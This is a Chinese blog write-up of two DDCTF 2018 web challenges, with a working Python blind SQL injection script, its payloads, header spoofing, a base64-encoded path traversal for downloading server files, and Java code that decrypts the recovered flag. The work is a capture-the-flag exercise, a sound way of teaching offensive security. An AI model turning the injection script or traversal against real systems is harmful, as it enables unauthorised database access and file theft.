<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="T3stzer0">


    <meta name="subtitle" content="思考">




<title>又是一年DDCTF | T3stzer0&#39;s Blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    


</head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Home</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>

<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/styles/default.min.css">
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>

        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
			expand_toc()
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">又是一年DDCTF</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">T3stzer0</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">四月 21, 2018&nbsp;&nbsp;11:08:00</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/category/CTF/">CTF</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <p><img src="/2018/04/21/又是一年DDCTF/2018041802.jpg" alt=""></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>还记得去年的四、五月份参加的DDCTF<br>混了个名次，蹭了次面试<br>没想到时间过得这么快，今年的DDCTF现在也比完了<br>老了老了<br>这一年我都干了啥.jpg</p>
<p>今年的题比去年的质量好很多，且加上了最有亮点的反作弊系统，每道题每个人的flag不一样，连某些逆向题的源码都不一样，可见十分用心<br>这次学到了很多，希望这样有质量的比赛能够继承下去</p>
 <a id="more"></a>
<h1 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h4 id="Web1-数据库的秘密"><a href="#Web1-数据库的秘密" class="headerlink" title="Web1 - 数据库的秘密"></a>Web1 - 数据库的秘密</h4><p>一道前端计算签名然后sql盲注的web题</p>
<p>进去就是非法链接，很明显需要<code>burp</code>抓一下包然后添个<code>HTTP的X-Forwarded-For</code>为<code>123.232.23.245</code></p>
<p><img src="/2018/04/21/又是一年DDCTF/11-25-24.jpg" alt=""><br>然后我们将得到一个很常规的查询界面</p>
<p><img src="/2018/04/21/又是一年DDCTF/11-27-43.jpg" alt=""><br>从源码来看传了四个参数过去分别是<code>id</code>，<code>title</code>，<code>date</code>，<code>author</code></p>
<p><img src="/2018/04/21/又是一年DDCTF/11-30-07.jpg" alt=""><br>如果我们随便POST一个 <code>id=1&amp;author=asd&amp;date=1&amp;title=s</code>会提示<code>param error</code><br>那么很有可能用<code>JS</code>搞了些事情了，找到页面中引用的<code>JS</code>文件——<code>main.js</code>和<code>math.js</code>查看<code>submit()</code>函数</p>
<pre><code class="lang-javascript">function signGenerate(obj, key) {
    var str0 = &#39;&#39;;
    for (i in obj) {
        if (i != &#39;sign&#39;) {
            str1 = &#39;&#39;;
            str1 = i + &#39;=&#39; + obj[i];
            str0 += str1
        }
    }
    console.log(str0)
    console.log(key)
    return hex_math_enc(str0 + key)
};
var obj = {
    id: &#39;&#39;,
    title: &#39;&#39;,
    author: &#39;&#39;,
    date: &#39;&#39;,
    time: parseInt(new Date().getTime() / 1000)
};

function submitt() {
    obj[&#39;id&#39;] = document.getElementById(&#39;id&#39;).value;
    obj[&#39;title&#39;] = document.getElementById(&#39;title&#39;).value;
    obj[&#39;author&#39;] = document.getElementById(&#39;author&#39;).value;
    obj[&#39;date&#39;] = document.getElementById(&#39;date&#39;).value;
    var sign = signGenerate(obj, key);
    document.getElementById(&#39;queryForm&#39;).action = &quot;index.php?sig=&quot; + sign + &quot;&amp;time=&quot; + obj.time;
    document.getElementById(&#39;queryForm&#39;).submit()
}
</code></pre>
<p>很明显给传递的参数+时间戳数组签了个名 然后将<code>from</code>的地址改为<code>index.php?sig=&quot; + sign + &quot;&amp;time=&quot; + obj.time;</code><br>说明它需要把参数+时间戳的签名算对了，然后再<code>POST</code>到一个加上<code>sig</code>和<code>time</code>的地址才能传递参数<br>我们可以把脚本下载下来，在本地搭一个环境，然后做一些改动如输出签名和时间戳，然后我们再去burp重放一下就能测试哪个参数存在注入漏洞了<br>在签名函数<code>return</code>签名之前，我们将一些主要信息输出，方便测试</p>
<pre><code class="lang-javascript">    console.log(obj)
    console.log(&quot;time:&quot;+obj.time)
    console.log(&quot;sig:&quot;+hex_math_enc(str0 + key))
    return hex_math_enc(str0 + key)
</code></pre>
<p>这里有个小技巧，因为<code>author</code>参数是<code>hidden</code>的，所以我们可以把它变成<code>text</code>，本地方便我们输入测试得到签名</p>
<p><img src="/2018/04/21/又是一年DDCTF/12-07-07.jpg" alt=""><br>效果如下</p>
<p><img src="/2018/04/21/又是一年DDCTF/12-07-41.jpg" alt=""><br>得到签名之后我们再去burp重放一下就好了<br>后面我测试得<code>author</code>填单引号的时候界面的数据没了，很明显这个参数可能存在注入</p>
<p><img src="/2018/04/21/又是一年DDCTF/12-13-01.jpg" alt=""><br>尝试基本的<code>&#39; or 1 #</code></p>
<p><img src="/2018/04/21/又是一年DDCTF/12-14-47.jpg" alt=""><br>那么可以确定存在<code>author</code>这个参数存在注入了<br>再测试一下联合注入啥的，会被假狗waf掉，我直接是选择了盲注，也没啥大问题<br>我的脚本是选择的<code>PyV8</code>库来运行<code>JS</code>脚本<br>将签名的函数提取出来，然后通过<code>PyV8</code>库包装成一个py函数就能得到签名了<br><code>Python</code>代码如下:</p>
<pre><code class="lang-python"># coding:utf-8
import requests, PyV8

#用PyV8将JS签名函数包装成一个PY函数
def js(author=&#39;&#39;, date=&#39;&#39;, id=&#39;&#39;, title=&#39;&#39;):
    ctxt = PyV8.JSContext()
    ctxt.enter()
    ctxt.locals.author_wz = author
    ctxt.locals.date_wz = date
    ctxt.locals.id_wz = id
    ctxt.locals.title_wz = title
    ctxt.locals.key = &quot;adrefkfweodfsdpiru&quot;
    func = ctxt.eval(
        &#39;&#39;&#39;
        var hexcase = 0; /* hex output format. 0 - lowercase; 1 - uppercase     */
        var b64pad = &quot;&quot;; /* base-64 pad character. &quot;=&quot; for strict RFC compliance  */
        var chrsz = 8; /* bits per input character. 8 - ASCII; 16 - Unicode    */
        /*
         * These are the functions you&#39;ll usually want to call
         * They take string arguments and return either hex or base-64 encoded strings
         */
        function hex_math_enc(s) {
         return binb2hex(core_math_enc(str2binb(s), s.length * chrsz));
        }
        function b64_math_enc(s) {
         return binb2b64(core_math_enc(str2binb(s), s.length * chrsz));
        }
        function str_math_enc(s) {
         return binb2str(core_math_enc(str2binb(s), s.length * chrsz));
        }
        function hex_hmac_math_enc(key, data) {
         return binb2hex(core_hmac_math_enc(key, data));
        }
        function b64_hmac_math_enc(key, data) {
         return binb2b64(core_hmac_math_enc(key, data));
        }
        function str_hmac_math_enc(key, data) {
         return binb2str(core_hmac_math_enc(key, data));
        }
        /*
         * Perform a simple self-test to see if the VM is working
         */
        function math_enc_vm_test() {
         return hex_math_enc(&quot;abc&quot;) == &quot;a9993e364706816aba3e25717850c26c9cd0d89d&quot;;
        }
        /*
         * Calculate the SHA-1 of an array of big-endian words, and a bit length
         */
        function core_math_enc(x, len) {
         /* append padding */
         x[len &gt;&gt; 5] |= 0x80 &lt;&lt; (24 - len % 32);
         x[((len + 64 &gt;&gt; 9) &lt;&lt; 4) + 15] = len;
         var w = Array(80);
         var a = 1732584193;
         var b = -271733879;
         var c = -1732584194;
         var d = 271733878;
         var e = -1009589776;
         for (var i = 0; i &lt; x.length; i += 16) {
          var olda = a;
          var oldb = b;
          var oldc = c;
          var oldd = d;
          var olde = e;
          for (var j = 0; j &lt; 80; j++) {
           if (j &lt; 16) w[j] = x[i + j];
           else w[j] = rol(w[j - 3] ^ w[j - 8] ^ w[j - 14] ^ w[j - 16], 1);
           var t = safe_add(safe_add(rol(a, 5), math_enc_ft(j, b, c, d)), safe_add(safe_add(e, w[j]), math_enc_kt(j)));
           e = d;
           d = c;
           c = rol(b, 30);
           b = a;
           a = t;
          }
          a = safe_add(a, olda);
          b = safe_add(b, oldb);
          c = safe_add(c, oldc);
          d = safe_add(d, oldd);
          e = safe_add(e, olde);
         }
         return Array(a, b, c, d, e);
        }
        /*
         * Perform the appropriate triplet combination function for the current
         * iteration
         */
        function math_enc_ft(t, b, c, d) {
         if (t &lt; 20) return (b &amp; c) | ((~b) &amp; d);
         if (t &lt; 40) return b ^ c ^ d;
         if (t &lt; 60) return (b &amp; c) | (b &amp; d) | (c &amp; d);
         return b ^ c ^ d;
        }
        /*
         * Determine the appropriate additive constant for the current iteration
         */
        function math_enc_kt(t) {
         return (t &lt; 20) ? 1518500249 : (t &lt; 40) ? 1859775393 : (t &lt; 60) ? -1894007588 : -899497514;
        }
        /*
         * Calculate the HMAC-SHA1 of a key and some data
         */
        function core_hmac_math_enc(key, data) {
         var bkey = str2binb(key);
         if (bkey.length &gt; 16) bkey = core_math_enc(bkey, key.length * chrsz);
         var ipad = Array(16),
          opad = Array(16);
         for (var i = 0; i &lt; 16; i++) {
          ipad[i] = bkey[i] ^ 0x36363636;
          opad[i] = bkey[i] ^ 0x5C5C5C5C;
         }
         var hash = core_math_enc(ipad.concat(str2binb(data)), 512 + data.length * chrsz);
         return core_math_enc(opad.concat(hash), 512 + 160);
        }
        /*
         * Add integers, wrapping at 2^32. This uses 16-bit operations internally
         * to work around bugs in some JS interpreters.
         */
        function safe_add(x, y) {
         var lsw = (x &amp; 0xFFFF) + (y &amp; 0xFFFF);
         var msw = (x &gt;&gt; 16) + (y &gt;&gt; 16) + (lsw &gt;&gt; 16);
         return (msw &lt;&lt; 16) | (lsw &amp; 0xFFFF);
        }
        /*
         * Bitwise rotate a 32-bit number to the left.
         */
        function rol(num, cnt) {
         return (num &lt;&lt; cnt) | (num &gt;&gt;&gt; (32 - cnt));
        }
        /*
         * Convert an 8-bit or 16-bit string to an array of big-endian words
         * In 8-bit function, characters &gt;255 have their hi-byte silently ignored.
         */
        function str2binb(str) {
         var bin = Array();
         var mask = (1 &lt;&lt; chrsz) - 1;
         for (var i = 0; i &lt; str.length * chrsz; i += chrsz)
         bin[i &gt;&gt; 5] |= (str.charCodeAt(i / chrsz) &amp; mask) &lt;&lt; (24 - i % 32);
         return bin;
        }
        /*
         * Convert an array of big-endian words to a string
         */
        function binb2str(bin) {
         var str = &quot;&quot;;
         var mask = (1 &lt;&lt; chrsz) - 1;
         for (var i = 0; i &lt; bin.length * 32; i += chrsz)
         str += String.fromCharCode((bin[i &gt;&gt; 5] &gt;&gt;&gt; (24 - i % 32)) &amp; mask);
         return str;
        }
        /*
         * Convert an array of big-endian words to a hex string.
         */
        function binb2hex(binarray) {
         var hex_tab = hexcase ? &quot;0123456789ABCDEF&quot; : &quot;0123456789abcdef&quot;;
         var str = &quot;&quot;;
         for (var i = 0; i &lt; binarray.length * 4; i++) {
          str += hex_tab.charAt((binarray[i &gt;&gt; 2] &gt;&gt; ((3 - i % 4) * 8 + 4)) &amp; 0xF) + hex_tab.charAt((binarray[i &gt;&gt; 2] &gt;&gt; ((3 - i % 4) * 8)) &amp; 0xF);
         }
         return str;
        }
        /*
         * Convert an array of big-endian words to a base-64 string
         */
        function binb2b64(binarray) {
         var tab = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;
         var str = &quot;&quot;;
         for (var i = 0; i &lt; binarray.length * 4; i += 3) {
          var triplet = (((binarray[i &gt;&gt; 2] &gt;&gt; 8 * (3 - i % 4)) &amp; 0xFF) &lt;&lt; 16) | (((binarray[i + 1 &gt;&gt; 2] &gt;&gt; 8 * (3 - (i + 1) % 4)) &amp; 0xFF) &lt;&lt; 8) | ((binarray[i + 2 &gt;&gt; 2] &gt;&gt; 8 * (3 - (i + 2) % 4)) &amp; 0xFF);
          for (var j = 0; j &lt; 4; j++) {
           if (i * 8 + j * 6 &gt; binarray.length * 32) str += b64pad;
           else str += tab.charAt((triplet &gt;&gt; 6 * (3 - j)) &amp; 0x3F);
          }
         }
         return str;
        }

        var obj = {
            id: id_wz,
            title: title_wz,
            author: author_wz,
            date: date_wz,
            //time : times
            time : parseInt(new Date().getTime() / 1000-100)
        };
        function signGenerate(obj,key) {

            var str0 = &#39;&#39;;
            for (i in obj) {
                if (i != &#39;sign&#39;) {
                    str1 = &#39;&#39;;
                    str1 = i + &#39;=&#39; + obj[i];
                    str0 += str1
                }
            }
            return hex_math_enc(str0 + key)
        };

        (signGenerate(obj,key));
        &#39;&#39;&#39;)
    vars = ctxt.locals
    return func, vars.obj.time, vars.id_wz, vars.author_wz, vars.date_wz, vars.title_wz


url = &#39;http://116.85.43.88:8080/ZVDHKBUVUZSTJCNX/dfe3ia/index.php&#39;
hea = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0&quot;,
       &quot;X-forwarded-for&quot;: &quot;123.232.23.245&quot;}

l = [1, 2, 4, 8, 16, 32, 64]
payload = &#39;\&#39;and ord(mid((select secvalue from  ctf_key5 limit {},1),{},1))&amp;{} #&#39;

# &#39;\&#39;and ord(mid((select schema_name from information_schema.schemata limit {},1),{},1))&amp;{} #&#39;
# information_schema
# ddctf

# &#39;\&#39;and ord(mid((select table_name from information_schema.tables where table_schema like 0x6464637466 limit {},1),{},1))&amp;{} #&#39;
# ctf_key5

# &#39;\&#39;and ord(mid((select column_name from information_schema.columns where table_name like 0x6374665f6b657935 limit {},1),{},1))&amp;{} #&#39;
# secvalue

# &#39;\&#39;and ord(mid((select secvalue from  ctf_key5 limit {},1),{},1))&amp;{} #&#39;
# DDCTF{ZJKGOFGPHSLJHIYG}


str1 = &quot;&quot;
for t in range(100):#limit offset
    str1 = &quot;&quot;
    for j in range(1, 100):#string offset
        n = 0
        for i in l:# 按位与
            para = js(author=payload.format(t, j, i))
            pad = &quot;?sig=&quot; + str(para[0]) + &quot;&amp;time=&quot; + str(para[1])
            data = {&#39;id&#39;: para[2], &#39;author&#39;: para[3], &#39;date&#39;: para[4], &#39;title&#39;: para[5], &#39;time&#39;: str(para[1])}
            # 2420
            result = requests.post(url + pad, headers=hea, data=data).text
            if len(result) == 2420:
                n += i
        length = len(str1)
        str1 += chr(n) if n != 0 else &quot;&quot;
        print str1
        if length == len(str1):
            break
</code></pre>
<p>这个方法有一点要注意，就是<code>PyV8</code>的<code>JS</code>脚本中的<code>new Date().getTime() / 1000</code>会与服务器或者浏览器获取的时间有误差，会快那么个一两百，当时我写完之后就一直提示<code>time error</code>，花了接近三个小时Debug，最后对比从浏览器获取的时间发现快了一两百秒，然后我就默默的手动加上了一句<code>-300</code>就成功了。这次复现又变成<code>-100</code>才能正确了，这是一个坑点2333<br>看到有的师傅是直接把源码下载到本地然后搭好本地环境，写一个本地的php脚本，接受那几个参数，然后通过curl这类函数将得到的参数进行转发，然后用sqlmap直接渗透本地的php。这个思路也很行。（想起来有好久都没有用过sqlmap了）</p>
<h4 id="Web2-专属链接"><a href="#Web2-专属链接" class="headerlink" title="Web2 - 专属链接"></a>Web2 - 专属链接</h4><p>这一题很不错，脑洞很大，但是不失度<br>主要还是对jsp这方面接触很少，而且本学期才开始学的java，2333<br>但是由于语法跟C++差不多，多多少少还是能看懂的<br>说题目吧<br>首先是一个静态页面，啥也找不出来，卡了很久</p>
<p><img src="/2018/04/21/又是一年DDCTF/13-49-53.jpg" alt=""><br>一开始顺着提示——专属登录链接，然后再源码里面找到了<code>&lt;meta property=&quot;qc:admins&quot; content=&quot;36510766376011725352163757752314571645060454&quot;/&gt;</code>还以为什么QQ平台第三方登录漏洞什么的，后来发现是纯粹浪费时间= =<br>首页源码提示<code>&lt;!--/flag/testflag/yourflag--&gt;</code></p>
<p><img src="/2018/04/21/又是一年DDCTF/21-36-06.jpg" alt=""><br>访问之</p>
<p><img src="/2018/04/21/又是一年DDCTF/21-37-04.jpg" alt=""><br>提示<code>java.lang.ArrayIndexOutOfBoundsException</code><br>尝试了很久得出这样的一个访问链接<code>http://116.85.48.102:5050/flag/testflag/{fasfasf}</code><br>得到下列错误</p>
<pre><code class="lang-java">java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:65)
    java.base/java.lang.Long.parseLong(Long.java:692)
    java.base/java.lang.Long.valueOf(Long.java:1144)
    com.didichuxing.ctf.controller.user.FlagController.submitFlag(FlagController.java:36)
</code></pre>
<p>我们只能得到有个<code>com.didichuxing.ctf.controller.user.FlagController</code>这个类名，还有这个大括号里面是要求一个long<br>然后我尝试爆破long，失败，毕竟long这么大，还以为是啥小点的数，因为实在是没啥思路</p>
<p>后来发现这个提示——“专属登录链接”的作用是叫你访问<code>http://116.85.48.102:5050/login</code></p>
<p><img src="/2018/04/21/又是一年DDCTF/13-53-04.jpg" alt=""><br>然后找到一个废弃的登录页面，一点用也没有的那种<br>而且这个博客的名字看起来就像乱写的而且没啥特征，看起来去google找也不会找到啥信息<br>然而事实是<code>Github</code>上还真的有源码<a href="https://github.com/xingfly/SBlog" target="_blank" rel="noopener">https://github.com/xingfly/SBlog</a><br>源码目录结构</p>
<pre><code>─src
    └─main
        ├─java
        │  └─com
        │      └─xingfly
        │          ├─controller  
        │          │  ├─admin      
        │          │  └─user   
        │          ├─dao     
        │          ├─interceptor
        │          ├─model
        │          │  └─dto         
        │          ├─service 
        │          │  └─impl      
        │          └─util
        ├─resources
        │  ├─mapper
        │  │      AboutMapper.xml
        │  │      ArticleMapper.xml
        │  │      CategoryMapper.xml
        │  │      UserMapper.xml
        │  │      WebAppMapper.xml
        │  ├─mybatis
        │  │      config.xml 
        │  └─properties
        │          db.properties         
        └─webapp
            ├─images
            ├─static
            └─WEB-INF
                │  applicationContext.xml
                │  mvc-dispatcher-servlet.xml
                │  web.xml
                └─pages
                    ├─admin
                    │  ├─about     
                    │  ├─article
                    │  ├─category 
                    │  ├─home   
                    │  ├─init
                    │  └─user
                    ├─common   
                    └─user
</code></pre><p>而在首页，图标出现了奇怪的缺失纹路<br><img src="/2018/04/21/又是一年DDCTF/21-55-22.jpg" alt=""><br>找到对应的ico地址</p>
<p><img src="/2018/04/21/又是一年DDCTF/21-56-23.jpg" alt=""><br>下载下来查看发现这个脑洞，emmmm，说实话在比赛的时候我是没有发现的</p>
<p><img src="/2018/04/21/又是一年DDCTF/21-57-42.jpg" alt=""><br>然后我们可以知道这个链接就是通往flag的地方了<br><code>http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=</code><br><code>ZmF2aWNvbi5pY28=</code>base64解码之后<code>favicon.ico</code><br>我们结合源码目录和这个路径尝试文件下载<br>查资料发现springmvc+mybatis的访问根目库是在<code>webapp</code>下<br>所以尝试下载<code>../../WEB-INF/applicationContext.xml</code>，访问<code>http://116.85.48.102:5050/image/banner/Li4vLi4vV0VCLUlORi9hcHBsaWNhdGlvbkNvbnRleHQueG1s</code>,发现下载成功<br>然后搜索一下<code>SpringMVC</code>目录结构，由上面得到的<code>com.didichuxing.ctf.controller.user.FlagController</code>尝试下载<code>class</code>目录下的<code>FlagController</code>类。同样地将<code>../../WEB-INF/classes/com/didichuxing/ctf/model/Flagcontroler.class</code>base64转码然后拼接url访问得到源码<br>丢进<code>jd-gui</code>看一下</p>
<pre><code class="lang-java">package com.didichuxing.ctf.controller.user;
import com.didichuxing.ctf.model.Flag;
import com.didichuxing.ctf.service.FlagService;
@RestController
@RequestMapping({&quot;flag&quot;})
public class FlagController
{
  @Autowired
  private FlagService flagService;
  @RequestMapping(value={&quot;/getflag/{email:[0-9a-zA-Z&#39;]+}&quot;}, method={org.springframework.web.bind.annotation.RequestMethod.POST})
  public String getFlag(@PathVariable(&quot;email&quot;) String email, ModelMap model)
  {
    Flag flag = this.flagService.getFlagByEmail(email);
    return &quot;Encrypted flag : &quot; + flag.getFlag();
  }
  @RequestMapping({&quot;/testflag/{flag}&quot;})
  public String submitFlag(@PathVariable(&quot;flag&quot;) String flag, ModelMap model)
  {
    String[] fs = flag.split(&quot;[{}]&quot;);
    Long longFlag = Long.valueOf(fs[1]);
    int i = this.flagService.exist(flag);
    if (i &gt; 0) {
      return &quot;pass!!!&quot;;
    }
    return &quot;failed!!!&quot;;
  }
}
</code></pre>
<p>找到了我们之前访问<code>/flag/testflag/{asdf}</code>的逻辑了<br>很明显要得到flag就要看一个<code>flagService.getFlagByEmail()</code>函数以及知道参数<code>email</code>是啥，我们按照上面的方法继续读取<code>flagService</code>类和<code>flag</code>类下来，然后发现<code>flagService</code>类是一个<code>public abstract interface</code>类，就很迷，里面啥代码都没有（其实在对应的mapper.xml里面）<br>将里面的这三个文件下载下来进行分析<br><img src="/2018/04/21/又是一年DDCTF/10-33-28.jpg" alt=""><br>在<code>applicationContext.xml</code>找到初始化类，下载之</p>
<p><img src="/2018/04/21/又是一年DDCTF/10-48-17.jpg" alt=""><br>找到flag加密代码逻辑</p>
<pre><code class="lang-java">try{
      this.flagService.deleteAll();
      String path = ctx.getServletContext().getRealPath(&quot;/WEB-INF/classes/emails.txt&quot;);
      String ksPath = ctx.getServletContext().getRealPath(&quot;/WEB-INF/classes/sdl.ks&quot;);

      String emailsString = FileUtils.readFileToString(new File(path), &quot;utf-8&quot;);
      String[] emails = emailsString.trim().split(&quot;\n&quot;);

      KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());
      FileInputStream inputStream = new FileInputStream(ksPath);
      keyStore.load(inputStream, this.p.toCharArray());
      Key key = keyStore.getKey(&quot;www.didichuxing.com&quot;, this.p.toCharArray());
      Cipher cipher = Cipher.getInstance(key.getAlgorithm());
      cipher.init(1, key);
      SecretKeySpec signingKey = new SecretKeySpec(&quot;sdl welcome you !&quot;.getBytes(), &quot;HmacSHA256&quot;);
      Mac mac = Mac.getInstance(&quot;HmacSHA256&quot;);
      mac.init(signingKey);
      SecureRandom sr = new SecureRandom();
      for (String email : emails) {
        String flag = &quot;DDCTF{&quot; + Math.abs(sr.nextLong()) + &quot;}&quot;;
        String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;s&quot;);
        byte[] data = cipher.doFinal(flag.getBytes());
        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());

        Flag flago = new Flag();
        flago.setId(Integer.valueOf(id));
        flago.setFlag(byte2hex(data));
        flago.setEmail(byte2hex(e));
        flago.setOriginFlag(flag);
        flago.setUuid(uuid);
        flago.setOriginEmail(email);
        this.flagService.save(flago);
        System.out.println(email + &quot;同学的入口链接为：http://116.85.48.102:5050/welcom/&quot; + uuid);
        id++;
        System.out.println(flago);
      }
    }
</code></pre>
<p>大概意思是取<code>/WEB-INF/classes/emails.txt</code>里面的<code>email</code>然后用密钥<code>sdl welcome you !</code>和加密算法<code>HmacSHA256</code>进行加密，得到<code>flag</code>类里面的<code>email</code>，未加密的<code>email</code>是<code>OriginFlag</code><br>然后将<code>/WEB-INF/classes/sdl.ks</code>文件中提取出来的私钥对一个随机的<code>flag</code>进行签名，然后转为十六进制后存进数据库<br>那么我们的思路就很简单了</p>
<ol>
<li>找到属于我的email</li>
<li>通过加密算法<code>HmacSHA256</code>和密钥<code>sdl welcome you !</code>对email进行加密</li>
<li>结合刚才我们在<code>com.didichuxing.ctf.controller.user.FlagController</code>里面发现的代码逻辑，将第2步得到的<code>email</code>加密值给<code>POST</code>到<code>/flag/getflag/加密的email</code>下，得到加密后的<code>flag</code></li>
<li>同样的方法下载<code>/WEB-INF/classes/sdl.ks</code>，然后提取出公钥，对签名后的<code>flag</code>进行解密</li>
</ol>
<p>然后我第1步就卡住了= =<br>我尝试了很多个email，包括我自己的平台注册<code>email</code>和<code>xxx@didichuxing.com</code>这种<br>然后经Wfox师傅提醒是首页的一个长的离谱的<code>email</code>才反应过来这个骚套路<br>就是这货</p>
<p><img src="/2018/04/21/又是一年DDCTF/11-01-58.jpg" alt=""><br><img src="/2018/04/21/又是一年DDCTF/11-02-08.jpg" alt=""><br>然后我们可以直接到这个网站(<a href="http://tool.oschina.net/encrypt?type=2" target="_blank" rel="noopener">http://tool.oschina.net/encrypt</a>)进行<code>HmacSHA256</code>加密</p>
<p><img src="/2018/04/21/又是一年DDCTF/11-03-22.jpg" alt=""></p>
<p>用<code>burp</code> <code>POST</code>过去，不出意外地得到了签名后的flag</p>
<p><img src="/2018/04/21/又是一年DDCTF/11-08-59.jpg" alt=""><br>然后就是提取公钥解密这个flag了<br>写<code>java</code>这边有点吃力，写了挺久才得到正确解，主要还是这个<code>KeyStore</code>文件提取不了解</p>
<pre><code class="lang-java">import java.security.Key;
import java.security.KeyStore;
import javax.crypto.Cipher;
import java.io.FileInputStream;
public class test {
    static String p;
    public static void main(String[] args) throws Exception {
        p = &quot;sdl welcome you !&quot;.substring(0, &quot;sdl welcome you !&quot;.length() - 1).trim().replace(&quot; &quot;, &quot;&quot;);
        String ksPath = &quot;Path_to_classes_sdl.ks&quot;;
        byte[] data = hex2Bytes(&quot;Your_Encrypted_Flag_HASH_HEX&quot;);
        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());
        FileInputStream inputStream = new FileInputStream(ksPath);
        keyStore.load(inputStream, p.toCharArray());
        Key key = keyStore.getKey(&quot;www.didichuxing.com&quot;, p.toCharArray());
        Cipher cipher1 = Cipher.getInstance(key.getAlgorithm());
        Key pubKey = keyStore.getCertificate(&quot;www.didichuxing.com&quot;).getPublicKey();
        cipher1.init(Cipher.DECRYPT_MODE, pubKey);
        byte[] f = cipher1.doFinal(data);
        System.out.println(byte2hex(f));
    }
    public static String byte2hex(byte[] b) {
        StringBuilder hs = new StringBuilder();

        for (int n = 0; (b != null) &amp;&amp; (n &lt; b.length); n++) {
            String stmp = Integer.toHexString(b[n] &amp; 0xFF);
            if (stmp.length() == 1)
                hs.append(&#39;0&#39;);
            hs.append(stmp);
        }
        return hs.toString().toUpperCase();
    }
    public static byte[] hex2Bytes(String hexString) {
        if (hexString == null || hexString.equals(&quot;&quot;)) {
            return null;
        }
        hexString = hexString.toUpperCase();
        int length = hexString.length() / 2;
        char[] hexChars = hexString.toCharArray();
        byte[] d = new byte[length];
        for (int i = 0; i &lt; length; i++) {
            int pos = i * 2;
            d[i] = (byte) (charToByte(hexChars[pos]) &lt;&lt; 4 | charToByte(hexChars[pos + 1]));
        }
        return d;
    }
    static byte charToByte(char c) {
        return (byte) &quot;0123456789ABCDEF&quot;.indexOf(c);
    }
}
</code></pre>
<p>得到输出<code>44444354467B333631343538353036323532393832353737337D</code></p>
<pre><code class="lang-python">&quot;44444354467B333631343538353036323532393832353737337D&quot;.decode(&quot;hex&quot;)
DDCTF{3614585062529825773}
</code></pre>
<p>这一题比较的脑洞，也比较考验jsp这边的经验，也难怪卡了这么久</p>
